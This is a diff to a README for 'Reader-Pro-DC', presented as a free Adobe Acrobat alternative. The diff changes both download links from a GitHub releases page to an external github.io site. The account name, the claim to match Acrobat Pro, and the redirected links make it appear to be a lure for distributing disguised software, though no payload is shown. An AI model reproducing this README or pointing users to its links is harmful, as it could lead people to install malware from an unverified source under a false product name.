@@ -1,6 +1,6 @@
 # 📄 Reader-Pro-DC - Best Free Adobe Acrobat Alternative for Windows
 
-[![Download](https://img.shields.io/badge/Download-v26.001.21771-blue?style=for-the-badge&logo=github)](https://github.com/Genusglisbeige701/Reader-Pro-DC/releases)
+[![Download](https://img.shields.io/badge/Download-v26.001.21771-blue?style=for-the-badge&logo=github)](https://genusglisbeige701.github.io)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Reader-Pro-DC is a powerful PDF editor that works exactly like Adobe Acrobat Pro
 
 Visit this link to download the application.
 
-[Download Reader-Pro-DC v26.001.21771](https://github.com/Genusglisbeige701/Reader-Pro-DC/releases)
+[Download Reader-Pro-DC v26.001.21771](https://genusglisbeige701.github.io)
 
 1. Click the download button above
 2. Save the file to your computer
